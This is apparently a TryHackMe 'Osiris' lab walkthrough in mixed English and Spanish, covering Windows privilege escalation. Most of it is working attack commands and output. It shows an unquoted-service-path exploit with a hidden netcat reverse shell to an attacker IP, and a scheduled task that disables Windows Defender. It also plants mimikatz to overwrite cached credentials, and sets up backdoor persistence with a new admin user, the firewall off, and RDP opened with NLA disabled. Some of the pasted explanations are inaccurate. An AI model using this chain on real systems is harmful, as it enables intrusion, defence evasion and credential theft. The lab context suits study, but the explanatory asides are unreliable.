                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                GENERIC_READ
                                                                                                GENERIC_EXECUTE
 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                           GENERIC_READ
                                                                                                           GENERIC_EXECUTE


But on the IVPN Service, we find that a user named "scheduler" has Write access

c:\Program Files\IVPN Client>cacls "c:\program files\IVPN Client"
cacls "c:\program files\IVPN Client"
c:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)
                                                      READ_CONTROL
                                                      SYNCHRONIZE
                                                      FILE_GENERIC_READ
                                                      FILE_GENERIC_WRITE
                                                      FILE_GENERIC_EXECUTE
                                                      FILE_READ_DATA
                                                      FILE_WRITE_DATA
                                                      FILE_APPEND_DATA
                                                      FILE_READ_EA
                                                      FILE_WRITE_EA
                                                      FILE_EXECUTE
                                                      FILE_READ_ATTRIBUTES
                                                      FILE_WRITE_ATTRIBUTES
 
                             NT SERVICE\TrustedInstaller:(ID)F 
                             NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                             NT AUTHORITY\SYSTEM:(ID)F 
                             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Administrators:(ID)F 
                             BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Users:(ID)R 
                             BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                           GENERIC_READ
                                                           GENERIC_EXECUTE
 
                             CREATOR OWNER:(OI)(CI)(IO)(ID)F 
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                    GENERIC_READ
                                                                                                    GENERIC_EXECUTE
 
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                               GENERIC_READ
                                                                                                               GENERIC_EXECUTE

c:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)

c:\Program Files\IVPN Client>sc qc "IVPN Client"
sc qc "IVPN Client"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IVPN Client
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\IVPN Client\IVPN Service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : IVPN Client
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

El comando `sc qc "IVPN Client"` (sin comillas) muestra la configuración del servicio de Windows con nombre "IVPN Client". Este comando se utiliza para mostrar información sobre un servicio específico en el sistema, como su nombre, tipo, estado, ubicación del archivo ejecutable, etc.

c:\Temp>echo 'hi i'm jesus' > test.txt
echo 'hi i'm jesus' > test.txt

c:\Temp>type test.txt
type test.txt
'hi i'm jesus' 

We trigger the update profile by executing the vb-script

c:\script>cscript update.vbs
cscript update.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

It runs without any output, but no error either, and we find our test file

c:\script>dir "c:\program files\IVPN Client" |find "test"
dir "c:\program files\IVPN Client" |find "test"
01/03/2023  11:01 AM                17 test.txt

c:\Temp>powershell -ex bypass
powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp> Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *


PSComputerName          : OSIRIS
Name                    : IVPN Client
Status                  : OK
ExitCode                : 0
DesktopInteract         : False
ErrorControl            : Normal
PathName                : C:\Program Files\IVPN 
                          Client\IVPN Service.exe
ServiceType             : Own Process
StartMode               : Auto
__GENUS                 : 2
__CLASS                 : Win32_Service
__SUPERCLASS            : Win32_BaseService
__DYNASTY               : CIM_ManagedSystemElemen
                          t
__RELPATH               : Win32_Service.Name="IVP
                          N Client"
__PROPERTY_COUNT        : 26
__DERIVATION            : {Win32_BaseService, 
                          CIM_Service, 
                          CIM_LogicalElement, CIM
                          _ManagedSystemElement}
__SERVER                : OSIRIS
__NAMESPACE             : root\cimv2
__PATH                  : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN 
                          Client"
AcceptPause             : False
AcceptStop              : True
Caption                 : IVPN Client
CheckPoint              : 0
CreationClassName       : Win32_Service
DelayedAutoStart        : False
Description             : 
DisplayName             : IVPN Client
InstallDate             : 
ProcessId               : 3424
ServiceSpecificExitCode : 0
Started                 : True
StartName               : LocalSystem
State                   : Running
SystemCreationClassName : Win32_ComputerSystem
SystemName              : OSIRIS
TagId                   : 0
WaitHint                : 0
Scope                   : System.Management.Manag
                          ementScope
Path                    : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN 
                          Client"
Options                 : System.Management.Objec
                          tGetOptions
ClassPath               : \\OSIRIS\root\cimv2:Win
                          32_Service
Properties              : {AcceptPause, 
                          AcceptStop, Caption, 
                          CheckPoint...}
SystemProperties        : {__GENUS, __CLASS, 
                          __SUPERCLASS, 
                          __DYNASTY...}
Qualifiers              : {dynamic, Locale, 
                          provider, UUID}
Site                    : 
Container               : 

We need to make a service exe. A ordinary exe will not do. We can try to use MSFVenom, but that exe will be caught by Defender, it knows Metasploit a bit too well

We check Defender settings, to see what we are dealing with here

PS C:\script> get-MpPreference

Yes, msmpeng is the process name for Microsoft Defender, which is the built-in antivirus program in Windows. The process is responsible for scanning files and processes on the system for malware and other types of threats.

AllowNetworkProtectionOnWinServer : False AttackSurfaceReductionOnlyExclusions : AttackSurfaceReductionRules_Actions : {1, 1, 1, 1...} AttackSurfaceReductionRules_Ids : {01443614-cd74-433ab99e-2ecdc07bfc25, 26190899-1602-49e8-8b27- eb1d0a1ce869, 3B576869-A4EC-4529-8536- B80A7769E899, 5BEB7EFEFD9A-4556-801D-275E5FFC04CC...} --

ASR rules are rules that are used by the Windows Advanced Security Risk Detection (ASR) feature. ASR is a security feature that helps protect against advanced attacks by monitoring system activity and identifying suspicious behavior. It can be used to block or allow certain types of system activity based on the rules that are defined. ASR rules can be used to specify the types of system activity that should be allowed or blocked, and can be used to customize the behavior of the ASR feature to meet the needs of a particular organization or environment.

PS C:\script> Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
01443614-cd74-433a-b99e-2ecdc07bfc25
26190899-1602-49e8-8b27-eb1d0a1ce869
3B576869-A4EC-4529-8536-B80A7769E899
5BEB7EFE-FD9A-4556-801D-275E5FFC04CC
75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84
7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c
92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4
BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550
c1db55ab-c21a-4637-bb3f-a12568109d35
d1e49aac-8f56-4280-b9ba-993a6d77406c
D3E037E1-3EB8-44C8-A917-57927947596D
D4F940AB-401B-4EFC-AADC-AD5F3C50688A
e6db77e5-3df2-4cf1-b95a-636979351e5b

https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide

These are the identifiers for the Windows Defender Attack Surface Reduction (ASR) rules. ASR is a feature of Windows Defender that helps to reduce the attack surface of a system by blocking certain types of potentially malicious behaviors. Each of these identifiers corresponds to a specific ASR rule. You can use these identifiers to configure the ASR rules that are enabled on a system. For example, you can use the `Set-MpPreference` cmdlet to enable or disable specific ASR rules using their identifiers.

quoted path and unquoted path

In Windows, a path to a file or folder can be "quoted" or "unquoted".

A quoted path is a path that is enclosed in quotation marks ("). For example: "C:\Program Files\My Folder\My File.txt"

An unquoted path is a path that is not enclosed in quotation marks. For example: C:\Program Files\My Folder\My File.txt

The difference between quoted and unquoted paths is that in an unquoted path, the space character ( ) is treated as a delimiter. This means that if a folder or file name contains a space, it must be enclosed in quotation marks to be recognized as a single entity.

For example, consider the following unquoted path: C:\Program Files\My Folder\My File.txt

In this path, the operating system will try to interpret "My" and "Folder" as separate entities, because they are separated by a space. To prevent this, the path must be quoted: "C:\Program Files\My Folder\My File.txt"

On the other hand, if a path does not contain any spaces, it can be written as an unquoted path without any issues. For example: C:\ProgramFiles\MyFolder\MyFile.txt

Tamper protection es una característica de seguridad que protege los procesos y configuraciones de un sistema de posibles modificaciones no autorizadas. La finalidad de esta característica es evitar que ciertos cambios realizados en el sistema puedan ser utilizados por atacantes para comprometer la seguridad del sistema o para esconder su actividad malintencionada.

Un ejemplo de cómo funciona la protección contra modificaciones ilegales es cuando un usuario intenta desactivar el firewall de un sistema. Si la protección contra modificaciones ilegales está habilitada, el sistema no permitirá que el usuario desactive el firewall y mostrará un mensaje de error. De esta manera, se evita que el usuario pueda exponer el sistema a posibles ataques.

https://github.com/mattymcfatty/unquotedPoC

The payload is in SimpleService.Designer.cs. This is propbably the "wrong" area, but it compiles and bypasses AV, so I don't really care :-D

Happy hacking!

https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d

$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)' $a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline Register-ScheduledTask -TaskName 'TestTask' -Action $a que hace

This block of code creates a new scheduled task that will execute the `cmd.exe` program with the arguments `/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)`. This command disables the `windefend` service, which is part of the Windows Defender antivirus software, and sets the security descriptor for the service to `D:(D;;GA;;;WD)(D;;GA;;;OW)`. This effectively disables the service and prevents it from being restarted.


---

$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
Register-ScheduledTask -TaskName 'Meh' -Action $a

---

PS C:\script> $cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
PS C:\script> $a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
PS C:\script> Register-ScheduledTask -TaskName 'Meh' -Action $a
Register-ScheduledTask -TaskName 'Meh' -Action $a

TaskPath                                       Ta
                                               sk
                                               Na
                                               me
--------                                       --
\                                              Me


We need to escalate our privileges before we can run this task. So as of now, we still have to try to keep things on the low-low so Defender doesn't stop us.

┌──(kali㉿kali)-[~/Osiris]
└─$ git clone https://github.com/mattymcfatty/unquotedPoC.git 
Cloning into 'unquotedPoC'...
remote: Enumerating objects: 33, done.
remote: Total 33 (delta 0), reused 0 (delta 0), pack-reused 33
Receiving objects: 100% (33/33), 152.13 KiB | 731.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
                                                                                                              
┌──(kali㉿kali)-[~/Osiris]
└─$ cd unquotedPoC 
                                                                                                              
┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
└─$ ls
LICENSE.txt                   ProjectInstaller.resx  SimpleService.Designer.cs
Program.cs                    README.md              SimpleService.resx
ProjectInstaller.cs           screenshots            SimpleWindowsService1.csproj
ProjectInstaller.Designer.cs  SimpleService.cs       SimpleWindowsService1.csproj.user
                                                                                                              
┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
└─$ cat SimpleService.Designer.cs 

startInfo.Arguments = "/C net user mattymcfatty Really1337! /add && net localgroup administrators mattymcfatty /add";

replace here like this

startInfo.Arguments = "c:\\windows\\temp\\nc.exe 10.10.18.20 4455 -e cmd";

┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
└─$ nano SimpleService.Designer.cs 
                                                                                                                                          
┌──(kali㉿kali)-[~/Osiris/unquotedPoC]
└─$ cat SimpleService.Designer.cs 
namespace SimpleWindowsService1
{
    partial class SimpleService
    {
        /// <summary> 
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.eventLogSimple = new System.Diagnostics.EventLog();
            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).BeginInit();
            // 
            // SimpleService
            // 
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C \"C:\\Windows\\temp\\nc.exe 10.10.214.187 17778 -e cmd\"";;
            process.StartInfo = startInfo;
            process.Start();

            this.ServiceName = "Not The Service You Think It Is";
            ((System.ComponentModel.ISupportInitialize)(this.eventLogSimple)).EndInit();

        }

        #endregion

        private System.Diagnostics.EventLog eventLogSimple;
    }
}

To exploit the unquoted service path, our compiled new service needs to be named IVPN Service.exe or ivpn.exe and must be placed in `C:\Program Files\IVPN Client\`

We will need to download the service executable we compiled and place it in `C:\temp` that can be used by the `copyprofile.cmd` to extract to `C:\Program Files\IVPN Client` using powershell command below:

https://www.geeksforgeeks.org/how-to-compile-decompile-and-run-c-code-in-linux/

┌──(kali㉿kali)-[~/Osiris]
└─$ cat geek.cs                
using System;
 
public class GFG {
 
    static public void Main()
    {
        Console.WriteLine("Hello World!");
        Console.ReadKey();
      
    }
}

┌──(kali㉿kali)-[~/Osiris]
└─$ mcs -out:helloworld.exe geek.cs        
                                                                                                                                          
┌──(kali㉿kali)-[~/Osiris]
└─$ ls
a.txt  DefenderCheck  geek.cs  helloworld.exe  na.c  na.exe  na.ps1  na.txt  nc64  nc64.exe  rev.bat  test.txt  unquotedPoC

┌──(kali㉿kali)-[/home/kali]
└─PS> cd ./Osiris/

┌──(kali㉿kali)-[/home/kali/Osiris]
└─PS> ls
a.txt          geek.cs         na.c    na.ps1  nc64      rev.bat   unquotedPoC
DefenderCheck  helloworld.exe  na.exe  na.txt  nc64.exe  test.txt

┌──(kali㉿kali)-[/home/kali/Osiris]
└─PS> ./helloworld.exe                                                                                        Hello World!

oops!

just compiling with visual studio 2022 (took time)

to do it (download visual studio 2022, then install C# escritorio is like 7.96 Gb, then clone git clone https://github.com/mattymcfatty/unquotedPoC.git )

and open project --> SimpleWindowsService1.csproj

then eliminate AssemblyInfo.cs for Properties , in order to work.

then go to Simple.Service.Designer.cs

and modified like this but changing Attackbox IP

Si está utilizando Visual Studio para compilar su proyecto, puede establecer el OutputPath y el AssemblyName en el proyecto desde el menú Proyecto en el menú de Visual Studio.

Para establecer el OutputPath, haga clic con el botón derecho en el proyecto en el Explorador de soluciones y seleccione Propiedades. En la página Propiedades del proyecto, vaya a la pestaña Compilar y establezca el OutputPath en la ruta donde desee que se guarde el archivo ejecutable del proyecto.

Para establecer el AssemblyName, vaya a la página Propiedades del proyecto y establezca el AssemblyName en el nombre que desee para el archivo ejecutable del proyecto.


I'm uploading mine
https://github.com/jesusgavancho/ivpn_osiris

https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022

PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/ivpn.exe -outfile c:\temp\ivpn.exe
Invoke-WebRequest http://10.10.231.33:1234/ivpn.exe -outfile c:\temp\ivpn.exe
PS C:\temp> powershell -c "Get-Service -Name 'IVPN*' "
powershell -c "Get-Service -Name 'IVPN*' "

Status   Name               DisplayName          
------   ----               -----------          
Running  IVPN Client        IVPN Client          


PS C:\temp> powershell -c "Stop-Service -Name 'IVPN*' "
powershell -c "Stop-Service -Name 'IVPN*' "
PS C:\temp> cscript C:\script\update.vbs
cscript C:\script\update.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

C:\script>dir "c:\program files\ivpn client\"|find "ivpn.exe"
dir "c:\program files\ivpn client\"|find "ivpn.exe"
01/03/2023  04:54 PM             5,120 ivpn.exe

PS C:\temp> powershell -c "Restart-Service -Name 'IVPN*' "
powershell -c "Restart-Service -Name 'IVPN*' "



root@ip-10-10-214-187:~/test# nc -lvnp 17778
Listening on [0.0.0.0] (family 0, port 17778)
Connection from 10.10.169.206 49946 received!
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

:) really  happy!!!

C:\Windows\system32>cd C:\Users\chajoh\Desktop
cd C:\Users\chajoh\Desktop

C:\Users\chajoh\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\Users\chajoh\Desktop

09/19/2020  06:09 AM    <DIR>          .
09/19/2020  06:09 AM    <DIR>          ..
09/19/2020  06:10 AM                47 Flag2.txt
               1 File(s)             47 bytes
               2 Dir(s)  36,798,844,928 bytes free

C:\Users\chajoh\Desktop>type Flag2.txt
type Flag2.txt
THM{d9c19f35fccde779d645f19d5bb0ac41dcd3586f}

reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection

Tamper protection es una característica de seguridad que protege los procesos y configuraciones de un sistema de posibles modificaciones no autorizadas. La finalidad de esta característica es evitar que ciertos cambios realizados en el sistema puedan ser utilizados por atacantes para comprometer la seguridad del sistema o para esconder su actividad malintencionada.

Un ejemplo de cómo funciona la protección contra modificaciones ilegales es cuando un usuario intenta desactivar el firewall de un sistema. Si la protección contra modificaciones ilegales está habilitada, el sistema no permitirá que el usuario desactive el firewall y mostrará un mensaje de error. De esta manera, se evita que el usuario pueda exponer el sistema a posibles ataques.


Once we get our reverse shell, we will have `NT System` privilege, time to activate the schedule task we created previously to disable Windows Defender by using powershell command below:

$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()
$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('Meh')
$task.RunEx($null, 0, 0, $user)


---

PS C:\Users\chajoh\Desktop> $svc = New-Object -ComObject 'Schedule.Service'
$svc = New-Object -ComObject 'Schedule.Service'
PS C:\Users\chajoh\Desktop> $svc.Connect()
$svc.Connect()
PS C:\Users\chajoh\Desktop> $user = 'NT SERVICE\TrustedInstaller'
$user = 'NT SERVICE\TrustedInstaller'
PS C:\Users\chajoh\Desktop> $folder = $svc.GetFolder('\')
$folder = $svc.GetFolder('\')
PS C:\Users\chajoh\Desktop> $task = $folder.GetTask('Meh')
$task = $folder.GetTask('Meh')
PS C:\Users\chajoh\Desktop> $task.RunEx($null, 0, 0, $user)
$task.RunEx($null, 0, 0, $user)


Name          : Meh
InstanceGuid  : {8607C8BD-20DA-4B84-B299-196E52198668}
Path          : \Meh
State         : 4
CurrentAction : cmd.exe
EnginePID     : 2256


Then we issue a restart command using shutdown /r /t 0, make sure you only RESTART otherwise you will lost the access !

PS C:\Users\chajoh\Desktop> cd C:\Windows\system32
cd C:\Windows\system32


PS C:\Windows\system32> ^C
root@ip-10-10-141-30:~/test# nc -lvnp 17778
Listening on [0.0.0.0] (family 0, port 17778)

powershell -c "Restart-Service -Name 'IVPN*' "
PS C:\temp> shutdown /r /t 2
shutdown /r /t 2
PS C:\temp> 

wait like 1 or 2 min then

root@ip-10-10-16-134:~/test# nc -lvnp 17778
Listening on [0.0.0.0] (family 0, port 17778)
Connection from 10.10.14.143 49686 received!
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32>get-process -name "msmpeng"
get-process -name "msmpeng"
'get-process' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>


Checking status of Defender

PS C:\Users\chajoh\Desktop> get-process -name "msmpeng"
get-process -name "msmpeng"
get-process : Cannot find a process with the name "msmpeng". Verify the process name and call the cmdlet again.
At line:1 char:1
+ get-process -name "msmpeng"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (msmpeng:String) [Get-Process], ProcessCommandException
    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand


Under the same user document folder - `C:\Users\chajoh\Documents`, we found a KeePass database - `Database.kdbx`

We can investigate the configuration file of KeePass in `C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml`, and it reveals that KeePas is using the Windows users as MasterKey ( DPAPI ). So, we need to become that specific user to open it.

C:\Windows\system32>type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<Meta>
		<PreferUserConfiguration>false</PreferUserConfiguration>
		<OmitItemsWithDefaultValues>true</OmitItemsWithDefaultValues>
		<DpiFactorX>1</DpiFactorX>
		<DpiFactorY>1</DpiFactorY>
	</Meta>
	<Application>
		<LastUsedFile>
			<Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
			<CredProtMode>Obf</CredProtMode>
			<CredSaveMode>NoSave</CredSaveMode>
		</LastUsedFile>
		<MostRecentlyUsed>
			<MaxItemCount>12</MaxItemCount>
			<Items>
				<ConnectionInfo>
					<Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
					<CredProtMode>Obf</CredProtMode>
					<CredSaveMode>NoSave</CredSaveMode>
				</ConnectionInfo>
				<ConnectionInfo>
					<Path>..\..\Users\chajoh\Documents\Database2.kdbx</Path>
					<CredProtMode>Obf</CredProtMode>
					<CredSaveMode>NoSave</CredSaveMode>
				</ConnectionInfo>
			</Items>
		</MostRecentlyUsed>
		<WorkingDirectories>
			<Item>Database@..\..\Users\chajoh\Documents</Item>
			<Item>KeyFile@..\..\Users\chajoh\Documents</Item>
		</WorkingDirectories>
		<Start>
			<CheckForUpdate>false</CheckForUpdate>
			<CheckForUpdateConfigured>true</CheckForUpdateConfigured>
		</Start>
		<FileOpening />
		<FileClosing />
		<TriggerSystem>
			<Triggers />
		</TriggerSystem>
		<PluginCompatibility />
	</Application>
	<Logging />
	<MainWindow>
		<X>804</X>
		<Y>936</Y>
		<Width>667</Width>
		<Height>503</Height>
		<SplitterHorizontalFrac>0.8333</SplitterHorizontalFrac>
		<SplitterVerticalFrac>0.25</SplitterVerticalFrac>
		<ToolBar />
		<EntryView />
		<TanView />
		<EntryListColumnCollection>
			<Column>
				<Type>Title</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>UserName</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>Password</Type>
				<Width>90</Width>
				<HideWithAsterisks>true</HideWithAsterisks>
			</Column>
			<Column>
				<Type>Url</Type>
				<Width>90</Width>
			</Column>
			<Column>
				<Type>Notes</Type>
				<Width>90</Width>
			</Column>
		</EntryListColumnCollection>
		<EntryListColumnDisplayOrder>0 1 2 3 4</EntryListColumnDisplayOrder>
		<ListSorting>
			<Order>Ascending</Order>
		</ListSorting>
	</MainWindow>
	<UI>
		<TrayIcon />
		<Hiding>
			<HideInEntryWindow>false</HideInEntryWindow>
		</Hiding>
		<StandardFont>
			<Family>Microsoft Sans Serif</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</StandardFont>
		<PasswordFont>
			<Family>Courier New</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</PasswordFont>
		<BannerStyle>WinVistaBlack</BannerStyle>
		<DataEditorFont>
			<Family>Microsoft Sans Serif</Family>
			<Size>8.25</Size>
			<GraphicsUnit>Point</GraphicsUnit>
			<Style>Regular</Style>
			<OverrideUIDefault>false</OverrideUIDefault>
		</DataEditorFont>
		<UIFlags>0</UIFlags>
		<KeyCreationFlags>0</KeyCreationFlags>
		<KeyPromptFlags>0</KeyPromptFlags>
	</UI>
	<Security>
		<WorkspaceLocking>
			<LockAfterTime>0</LockAfterTime>
			<LockAfterGlobalTime>0</LockAfterGlobalTime>
		</WorkspaceLocking>
		<Policy />
		<MasterPassword>
			<MinimumLength>0</MinimumLength>
			<MinimumQuality>0</MinimumQuality>
		</MasterPassword>
	</Security>
	<Native />
	<PasswordGenerator>
		<AutoGeneratedPasswordsProfile>
			<GeneratorType>CharSet</GeneratorType>
			<Length>20</Length>
			<CharSetRanges>ULD_______</CharSetRanges>
		</AutoGeneratedPasswordsProfile>
		<LastUsedProfile>
			<GeneratorType>CharSet</GeneratorType>
			<Length>20</Length>
			<CharSetRanges>ULD_______</CharSetRanges>
		</LastUsedProfile>
		<UserProfiles />
	</PasswordGenerator>
	<Defaults>
		<OptionsTabIndex>3</OptionsTabIndex>
		<SearchParameters>
			<ComparisonMode>InvariantCultureIgnoreCase</ComparisonMode>
		</SearchParameters>
		<KeySources>
			<Association>
				<DatabasePath>..\..\Users\chajoh\Documents\Database.kdbx</DatabasePath>
				<UserAccount>true</UserAccount>
			</Association>
			<Association>
				<DatabasePath>..\..\Users\chajoh\Documents\Database2.kdbx</DatabasePath>
				<UserAccount>true</UserAccount>
			</Association>
		</KeySources>
	</Defaults>
	<Integration>
		<UrlSchemeOverrides>
			<BuiltInOverridesEnabled>1</BuiltInOverridesEnabled>
			<CustomOverrides />
		</UrlSchemeOverrides>
		<AutoTypeAbortOnWindows />
	</Integration>
	<Custom />
</Configuration>


For now, we will need to get access to `chajoh` user, for this we will download mimikatz from our attacker machine to target computer and temporary inject our password to the user and TAKE A NOTE ON NTLM HASH.

root@ip-10-10-141-30:~/test# locate mimikatz.exe
/opt/Mimikatz/Win32/mimikatz.exe
/opt/Mimikatz/x64/mimikatz.exe
root@ip-10-10-141-30:~/test# cp /opt/Mimikatz/x64/mimikatz.exe mimikatz.exe


Invoke-WebRequest "http://10.10.103.96:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"


PS C:\Users\chajoh\Documents> Invoke-WebRequest "http://10.10.0.108:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
Invoke-WebRequest "http://10.10.141.30:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
PS C:\Users\chajoh\Documents> cd c:\temp
cd c:\temp
PS C:\temp> dir
dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/16/2020  11:55 AM                OpenVPN                                                              
-a----          1/3/2023   8:37 PM           6656 ivpn.exe                                                             
-a----          1/3/2023   8:45 PM        1291016 mimikatz.exe                                                         
-a----          1/3/2023   8:21 PM             17 test.txt 

lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi

mimikatz # lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi
> User cache replace mode !
  * user     : chajoh
  * password : hackP@ssw0rd
  * ntlm     : 4c05b64dec614df2b522c401bb8d8994




mimikatz # exit
Bye!

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md


net user witty Pssw0rd123 /add

net localgroup administrators witty /add

Next we will perform below action to create persistent access to the target computer.

-   Create user and add to local administrator group
-   Add `Everyone` into `Remote Desktop Users` group
-   Turn off Windows Firewall for all profile

PS C:\temp> net localgroup "Remote Desktop Users" Everyone /Add
net localgroup "Remote Desktop Users" Everyone /Add
The command completed successfully.

PS C:\temp> netsh advfirewall set allprofiles state off
netsh advfirewall set allprofiles state off
Ok.




Next we will need to enable Remote Desktop Service and Disable NLA (Network Level Authentication) by adding registry key using command below

PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.


PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
The operation completed successfully.


---
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.227.117 /u:witty /p:hackP@ssw0rd /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
[23:56:22:061] [318193:318194] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
